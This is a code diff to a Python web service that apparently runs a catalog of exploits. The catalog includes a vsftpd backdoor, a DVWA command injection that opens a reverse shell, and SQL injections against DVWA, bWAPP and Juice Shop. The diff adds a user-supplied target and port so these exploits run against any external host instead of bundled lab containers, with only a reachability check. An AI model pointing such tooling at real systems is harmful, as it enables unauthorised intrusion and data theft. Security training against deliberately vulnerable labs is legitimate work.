@@ -4302,12 +4302,18 @@ async def exploit_vsftpd_234(target: str, sid: str) -> dict:
             "shell_port": backdoor_port}
 
 
-async def exploit_dvwa_cmdi(target: str, sid: str, lhost: str, lport: int) -> dict:
+def _xpl_web_base(target: str, port: int) -> str:
+    """Build an http://host[:port] URL. Skip the :port suffix for the default
+    HTTP port so URLs match what the customer would type in a browser."""
+    return f"http://{target}" if (not port or port == 80) else f"http://{target}:{port}"
+
+
+async def exploit_dvwa_cmdi(target: str, port: int, sid: str, lhost: str, lport: int) -> dict:
     """DVWA Command Injection (security=low). Logs in with admin/password,
     then submits an injected ping command that opens a reverse shell back
     to lhost:lport. We listen for that connection first so the shell is
     captured the moment DVWA executes the bash one-liner."""
-    base = f"http://{target}"
+    base = _xpl_web_base(target, port)
     sess = _req_lib.Session()
     # 1. Setup DB (idempotent — DVWA needs this on first boot)
     try:
@@ -4414,12 +4420,12 @@ async def exploit_dvwa_cmdi(target: str, sid: str, lhost: str, lport: int) -> di
             "payload": payload}
 
 
-async def exploit_dvwa_sqli(target: str, sid: str) -> dict:
+async def exploit_dvwa_sqli(target: str, port: int, sid: str) -> dict:
     """DVWA SQL Injection (security=low). Doesn't open a shell — instead
     dumps the users table (admin password hash) to prove RCE-equivalent
     data exfiltration. Shell-id returned is a virtual one whose 'output'
     is the dump."""
-    base = f"http://{target}"
+    base = _xpl_web_base(target, port)
     sess = _req_lib.Session()
     try:
         sess.get(f"{base}/setup.php", timeout=8, verify=False)
@@ -4562,11 +4568,11 @@ async def exploit_juiceshop_admin(target: str, port: int, sid: str) -> dict:
                 "cve": "JuiceShop-SQLi-AuthBypass"}
 
 
-async def exploit_bwapp_sqli(target: str, sid: str) -> dict:
+async def exploit_bwapp_sqli(target: str, port: int, sid: str) -> dict:
     """bWAPP SQL Injection (security=low). Install DB, login bee/bug, then
     UNION-inject the movies-search query so the visible columns carry
     users-table data. Parse the rendered <td> cells back out."""
-    base = f"http://{target}"
+    base = _xpl_web_base(target, port)
     sess = _req_lib.Session()
     try:
         # 1. Run /install.php?install=yes — idempotent, creates the bWAPP DB +
@@ -4760,20 +4766,41 @@ def _xpl_lhost_for(target: str) -> tuple:
 
 class ExploitRunRequest(BaseModel):
     exploit_id: str = ""
+    target: str = ""             # optional override — point exploit at an external host
+    port: Optional[int] = None   # optional override — port for the external target
 
 
 @app.post("/api/exploit/run")
 async def exploit_run(req: ExploitRunRequest, user=Depends(verify_token)):
     """Run one exploit from the catalog. Returns immediately with a shell_id
-    that the frontend uses to poll terminal output. All exploits are designed
-    to succeed against their named lab target — if they fail, the response
-    includes a clear error explaining what to check."""
+    that the frontend uses to poll terminal output. If req.target / req.port
+    are provided, the exploit runs against THAT host instead of the bundled
+    lab container — letting customers point our exploits at their own
+    vulnerable services. Otherwise the catalog default is used."""
     spec = next((e for e in EXPLOIT_CATALOG if e["id"] == req.exploit_id), None)
     if not spec:
         return {"ok": False, "error": f"Unknown exploit id: {req.exploit_id}"}
 
-    target = spec["target"]
-    port   = spec["port"]
+    # Customer override takes precedence over the catalog default. Strip out
+    # any scheme prefix (http://) the user may paste from a browser URL.
+    raw_target = (req.target or "").strip()
+    if raw_target:
+        raw_target = re.sub(r"^https?://", "", raw_target, flags=re.IGNORECASE).rstrip("/")
+        # Allow "host:port" pasted into a single field
+        if ":" in raw_target and req.port is None:
+            host_part, _, port_part = raw_target.rpartition(":")
+            if port_part.isdigit():
+                raw_target = host_part
+                req_port = int(port_part)
+            else:
+                req_port = None
+        else:
+            req_port = req.port
+    else:
+        req_port = req.port
+
+    target = raw_target if raw_target else spec["target"]
+    port   = req_port  if req_port      else spec["port"]
     sid    = f"exp_{spec['id']}_{uuid.uuid4().hex[:8]}"
 
     # Pre-flight — is the lab container reachable?
@@ -4788,18 +4815,19 @@ async def exploit_run(req: ExploitRunRequest, user=Depends(verify_token)):
                 "error": f"{target}:{port} is not accepting connections. Service may still be starting.",
                 "exploit_id": spec["id"]}
 
-    # Dispatch
+    # Dispatch — every exploit now accepts the resolved (target, port) so a
+    # customer override propagates to the URL/socket the exploit actually opens.
     if   spec["id"] == "vsftpd_234_backdoor":
         result = await exploit_vsftpd_234(target, sid)
     elif spec["id"] == "dvwa_cmdi_low":
         lhost, lport = _xpl_lhost_for(target)
-        result = await exploit_dvwa_cmdi(target, sid, lhost, lport)
+        result = await exploit_dvwa_cmdi(target, port, sid, lhost, lport)
     elif spec["id"] == "dvwa_sqli_low":
-        result = await exploit_dvwa_sqli(target, sid)
+        result = await exploit_dvwa_sqli(target, port, sid)
     elif spec["id"] == "juiceshop_admin_sqli":
         result = await exploit_juiceshop_admin(target, port, sid)
     elif spec["id"] == "bwapp_sqli_low":
-        result = await exploit_bwapp_sqli(target, sid)
+        result = await exploit_bwapp_sqli(target, port, sid)
     else:
         return {"ok": False, "error": f"Exploit {spec['id']} has no implementation"}
 
